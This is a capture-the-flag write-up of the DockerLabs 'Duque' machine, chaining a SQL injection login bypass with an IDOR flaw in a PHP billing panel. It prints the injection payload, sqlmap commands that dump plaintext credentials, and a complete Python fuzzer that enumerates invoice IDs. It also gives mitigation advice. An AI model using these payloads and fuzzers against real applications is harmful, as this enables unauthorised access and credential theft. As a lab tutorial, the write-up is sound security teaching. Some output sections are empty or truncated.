// 01

Summary

Duque is an Easy difficulty machine from the DockerLabs platform. It exposes a single web service on port 80 running a custom PHP application that contains a billing panel reachable through directory enumeration.

The attack chain combines two classic web vulnerabilities chained together. First, a SQL Injection in the login form of the /bills/ endpoint is exploited both manually — to bypass authentication — and automatically with SQLMap, which dumps the entire register database and retrieves plaintext credentials for three users, including admin:admin123.

Once authenticated as admin, the application exposes invoice records through a predictable URL pattern (panel.php?id=xy****), which is vulnerable to Insecure Direct Object Reference (IDOR). A custom Python fuzzer iterates through all possible ID combinations and identifies a hidden invoice containing the credentials of the system user duque, completing the compromise.

// Vulnerability chain — SQLi + IDOR

This machine illustrates a common real-world pattern: a SQL Injection grants initial access to an authenticated area, while a secondary vulnerability — IDOR — then leaks data the attacker was not intended to access. Neither vulnerability alone reveals the final credentials; it is their sequential exploitation that completes the compromise. This chain underscores the importance of defence in depth: fixing one vulnerability is not sufficient if others remain unaddressed.

Reconnaissance

1
Deploy the machine

We deploy the vulnerable container using the auto_deploy.sh script provided by DockerLabs, passing the duque.tar archive as argument. The script pulls and starts the Docker image, assigns the internal IP 172.17.0.2, and keeps it running until Ctrl+C is pressed. sudo is required to manage Docker network interfaces.

DEPLOY
$ sudo bash auto_deploy.sh duque.tar

Press Ctrl+C when done to remove the machine
2
Directory enumeration — Gobuster

With the machine live, we run Gobuster in dir mode against port 80 to discover hidden directories and endpoints. We use the directory-list-lowercase-2.3-medium.txt wordlist from DirBuster — a solid general-purpose list covering the most common web paths. Gobuster sends HTTP GET requests for each word in the list and reports back any response that is not a 404, allowing us to map the application's structure before touching any functionality.

GOBUSTER
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

Gobuster reveals /bills/ — a billing panel endpoint not linked from the main page. This hidden application surface is the core attack vector for the entire machine. The 301 redirect confirms the directory exists and is actively serving content.

// 03

SQL Injection

3
Manual SQL Injection — authentication bypass

Navigating to http://172.17.0.2/bills/ presents a login form. After fuzzing the input fields, we identify a classic SQL Injection vulnerability in the username field. The payload 'or 1=1-- - causes the backend SQL query to always evaluate as true, completely bypassing the authentication check and granting access to the panel without valid credentials.

The payload works as follows: the leading single quote ' closes the string context in the SQL query, or 1=1 appends a condition that is always true, and -- - comments out the rest of the original query — including the password check — making the WHERE clause always return at least one row and thus authenticate successfully.

SQLI PAYLOAD
username: 'or 1=1-- -
password: [anything]
→ Authentication bypassed. Redirected to /bills/panel.php
4
Capture POST request — BurpSuite

To automate the injection with SQLMap, we first need the raw HTTP request. We configure our browser to route traffic through BurpSuite acting as an HTTP proxy, then submit the login form with any test credentials. BurpSuite intercepts the POST request to /bills/, which we save to a file (request.txt). This file will be passed to SQLMap via the -r flag, replicating the exact headers, cookies, and body of a legitimate browser request — including the session cookie and CSRF token — to ensure injection accuracy.

POST /bills/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Content-Type: application/x-www-form-urlencoded
Cookie: wp-settings-time-1=1776015782; csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg; PHPSESSID=im7874jb6qsmcg8j68fba8lbng
 
username=fran&password=fran1234
5
Enumerate databases — SQLMap --dbs

With the captured request saved as request.txt, we feed it to SQLMap using -r. The --dbs flag instructs SQLMap to enumerate all accessible databases on the server, and --batch accepts all default prompts non-interactively. SQLMap will automatically detect the injection point within the request body and test multiple payloads to extract database information.

SQLMAP
$ sqlmap -r request.txt --dbs --batch

[INFO] fetching database names

[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

// Key finding

Among the standard MySQL system databases, the register database stands out as an application-specific store. This is the target for further enumeration, as it is likely to contain user account information.

6
Enumerate tables — SQLMap -D register --tables

We narrow down the extraction to the register database using -D register and retrieve its table list with --tables. This reveals a single table named users — almost certainly the credential store for the application.

SQLMAP TABLES

[1 table]

+-------+

Enumerate columns — SQLMap -T users --columns

We add -T users and --columns to inspect the schema of the users table. The structure reveals three columns: id, username, and passwd, stored as plain varchar(50) — meaning credentials are not hashed, making their extraction immediately actionable.

Dump credentials — SQLMap --dump

With the column names confirmed, we dump all records from the users table specifying the columns explicitly with -C id,username,passwd and --dump. SQLMap extracts three entries in plaintext. The admin account with password admin123 is our entry point into the authenticated panel.

SQLMAP DUMP

9
Login as admin — access the panel

Using the dumped credentials admin / admin123, we log into the billing panel at http://172.17.0.2/bills/. The authenticated panel reveals two invoice entries accessible via the following URLs:

http://172.17.0.2/bills/panel.php?id=xya456
http://172.17.0.2/bills/panel.php?id=xyu597

// IDOR pattern detected

Both IDs share the same structure: xy + [letter] + [3 digits]. This predictable, sequential-style pattern is a hallmark of Insecure Direct Object References. If the server does not enforce authorisation checks on each ID, any valid-format ID could return invoice data regardless of ownership — including invoices belonging to other users.

// 04

IDOR Exploitation

10
Validate IDOR — BurpSuite Repeater

Before writing a full fuzzer, we verify the behaviour manually using BurpSuite Repeater. We craft a GET request with a random ID following the pattern — such as id=xyu453 — and send it to the server. The response is always 200 OK, regardless of whether the ID exists or not. This means we cannot distinguish valid invoices from empty responses based on the HTTP status code alone.

However, inspecting the raw HTML reveals a critical difference: empty (non-existent) invoices produce a page of length 5899 bytes, while invoices with actual content produce a larger response. This response-length differential is the discriminator we will use in our fuzzer.

GET /bills/panel.php?id=xyu453 HTTP/1.1
Host: 172.17.0.2
Cookie: PHPSESSID=im7874jb6qsmcg8j68fba8lbng
 
← HTTP/1.1 200 OK   Length: 5899 — empty invoice (baseline)
11
Build the fuzzer — fuzzer.py

We write a custom Python script that generates all possible IDs matching the xy[a-z][000-999] pattern — 26 × 1000 = 26,000 combinations. For each ID, it sends a GET request with the authenticated session cookie and compares the response length against the known empty-invoice baseline of 5,899 bytes. Any response with a different length indicates a valid invoice. A secondary check flags responses of exactly 5,987 bytes, identified as the fingerprint for invoices containing sensitive credential data.

FUZZER.PY
"""
=============================================================================
  Script:      Custom IDOR Fuzzer & Data Extractor
  Author:      Fran (@franlrs)
  Target:      Duque Machine (DockerLabs)
  Description: Fuzzing tool to exploit IDOR vulnerabilities by filtering
               HTTP response lengths. Identifies hidden sensitive data.
=============================================================================
"""
import requests
import string
 
# Target URL based on the provided HTTP request
TARGET_URL = "http://172.17.0.2/bills/panel.php"
 
# Headers copied exactly from the provided raw HTTP request to maintain session and format
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Cookie": "wp-settings-time-1=1776015782; csrftoken=EjLf807KTLwPCpe1ywwXLNTQe08SFQfg; PHPSESSID=im7874jb6qsmcg8j68fba8lbng",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}
 
# The baseline length for a "Not Found" invoice
FAILURE_LENGTH = 5899
 
print("+"*50)
print(f"[+] Starting fuzzing on {TARGET_URL}...")
print("+"*50)
 
# Generate combinations: xy + [letter] + [000-999]
 
try:
    for letter in string.ascii_lowercase:
        for i in range(1000):
 
            fuzz_id = f"xy{letter}{i:03d}"
            params = {'id': fuzz_id}
 
            try:
                response = requests.get(TARGET_URL, params=params, headers=HEADERS, timeout=5)
                current_length = len(response.text)
 
                # Check if the length is different from the standard failure length
                if current_length != FAILURE_LENGTH:
                    print(f"[+] SUCCESS! ID found: {fuzz_id} | Status: {response.status_code} | Length: {current_length}")
 
                    # Highlight the response that hides the password
                    if current_length == 5987:
                        print(f"    [!] ^^^ SENSITIVE DATA ALERT (PASSWORD LIKELY HERE) ^^^")
 
            except requests.exceptions.RequestException as e:
                print(f"[-] Connection error on ID {fuzz_id}: {e}")
                continue
 
except KeyboardInterrupt:
    print("\n[!] Process stopped by user.")
 
print("+"*50)
print("[+] Fuzzing finished.")
print("+"*50)

// Lessons learned

The Duque machine exposes two critical misconfigurations that compound each other. SQL Injection results from using unsanitised user input directly in database queries — solved with prepared statements and parameterised queries. IDOR results from trusting client-supplied identifiers without server-side ownership validation — every request for a resource must verify that the authenticated user is authorised to access that specific object. Neither vulnerability requires a sophisticated attacker: both are well-documented, tool-assisted, and listed in the OWASP Top 10.

Command Reference

gobuster dir
gobuster dir -u <URL> -w <wordlist>
Directory and file brute-forcing tool. Sends HTTP requests for each entry in the wordlist and reports non-404 responses, mapping the application's hidden structure.
  • dir — Directory/file enumeration mode
  • -u — Target URL
  • -w — Path to wordlist
  • -t — Number of concurrent threads
  • -x — File extensions to probe (e.g., php,html)
  • -o — Save output to file
  • -b — Status codes to blacklist
sqlmap
sqlmap -r <request.txt> --dbs --batch
Automated SQL injection detection and exploitation tool. Reads a raw HTTP request file, detects injection points, and extracts database content.
  • -r — Load raw HTTP request from file
  • --dbs — Enumerate all databases
  • -D — Target specific database
  • --tables — Enumerate tables
  • -T — Target specific table
  • --columns — Enumerate columns
  • -C — Columns to dump (comma-separated)
  • --dump — Extract all data from table
  • --batch — Non-interactive, accept defaults
BurpSuite (Proxy)
Proxy → Intercept → Save request.txt
Web application testing platform. Acts as an HTTP/HTTPS proxy to capture, inspect, and modify requests in transit between the browser and the server.
  • Intercept and capture raw HTTP requests
  • Repeater — replay and modify requests manually
  • Intruder — payload-based parameter fuzzing
  • Saved request used as input for SQLMap -r
  • Preserves session cookies and CSRF tokens
fuzzer.py
python3 fuzzer.py
Custom IDOR fuzzer written in Python. Generates all ID combinations matching the xy[a-z][000-999] pattern and filters valid responses by HTTP response length differential.
  • Generates 26 × 1000 = 26,000 combinations
  • Baseline empty response: 5899 bytes
  • Valid invoice fingerprint: 6153 bytes
  • Sensitive data fingerprint: 5987 bytes
  • Session cookie required in request headers
  • Timeout: 5 seconds per request
SQL Injection payload
'or 1=1-- -
Classic authentication bypass payload. Closes the SQL string context, injects a tautology, and comments out the remainder of the query — causing the WHERE clause to always return true.
  • ' — Closes the string context in the query
  • or 1=1 — Tautology that always evaluates true
  • -- - — Comments out the remaining SQL
  • Bypasses password validation entirely
  • Fix: use prepared statements / parameterised queries
auto_deploy.sh
sudo bash auto_deploy.sh <machine.tar>
DockerLabs deployment script. Loads the machine image from a tar archive, spins up the container, assigns a local IP within the Docker bridge network, and cleans up on Ctrl+C.
  • Requires sudo for Docker network management
  • Assigns IP in the 172.17.0.x range
  • Container is removed automatically on exit
  • No persistent state between deployments

Glossary

SQL Injection (SQLi)
SQL Injection is a code injection technique where an attacker inserts malicious SQL statements into an input field that is then executed by the backend database engine. It occurs when user-supplied data is not properly sanitised before being incorporated into a SQL query. Attack variants include authentication bypass (as used here), UNION-based extraction (retrieving data from other tables), blind SQLi (inferring data from boolean or time responses), and error-based extraction. Prevention requires the use of prepared statements with parameterised queries, which ensure user input is always treated as data, never as executable SQL code. SQLi has been listed in the OWASP Top 10 consistently since the list's inception.
IDOR — Insecure Direct Object Reference
IDOR is an access control vulnerability that arises when an application uses user-controllable input — such as a URL parameter — to access objects directly without verifying that the requesting user is authorised to access that specific object. In the Duque machine, the panel.php?id= parameter directly references invoice records with no ownership check. IDOR is categorised under Broken Access Control, the number-one risk in the OWASP Top 10 (2021). Mitigations include: replacing direct references with indirect references (session-scoped mapping tables), enforcing server-side authorisation checks on every request, and generating unpredictable IDs using cryptographically secure random tokens (UUIDs).
SQLMap
SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of database backends (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and others) and implements numerous injection techniques including boolean-based blind, time-based blind, error-based, UNION query-based, and stacked queries. The -r flag allows SQLMap to read a raw HTTP request file — preserving all headers, cookies, and the request body — making it ideal for POST-based injection points captured via a proxy. SQLMap is included by default in Kali Linux and Parrot OS.
Directory Enumeration — Gobuster
Directory enumeration is a reconnaissance technique that sends HTTP requests for paths derived from a wordlist, probing for content not linked from the application's visible interface. Gobuster is a Go-based tool that performs this at high speed with configurable concurrency. The wordlist used here — directory-list-lowercase-2.3-medium.txt from DirBuster — contains around 207,000 entries compiled from real-world web servers, making it highly effective at discovering common hidden paths. Other popular alternatives include ffuf and dirsearch.
BurpSuite — HTTP Proxy & Testing Platform
BurpSuite is an integrated platform for web application security testing developed by PortSwigger. In its most common use, it operates as an intercepting HTTP/HTTPS proxy: traffic between the browser and the server is routed through Burp, where requests and responses can be captured, inspected, and modified in real time. The Repeater module allows replaying individual requests with manual modifications — ideal for confirming IDOR behaviour as demonstrated in this machine. Saving a raw request from the Proxy tab produces a file directly compatible with SQLMap's -r flag.
Response Length Differential — Fuzzing Discriminator
When an application always returns HTTP 200 OK regardless of whether a requested resource exists, traditional status-code-based fuzzing fails. A response length differential is an alternative discriminator: the assumption is that valid and invalid responses differ in byte size — because a populated page contains more data than an empty one. By establishing a baseline length for the "not found" response and filtering out any response matching that length, a fuzzer can effectively isolate valid hits. This technique is essential for IDOR fuzzing scenarios and is also applicable to subdomain enumeration, parameter brute-forcing, and credential stuffing where the server always responds with 200.
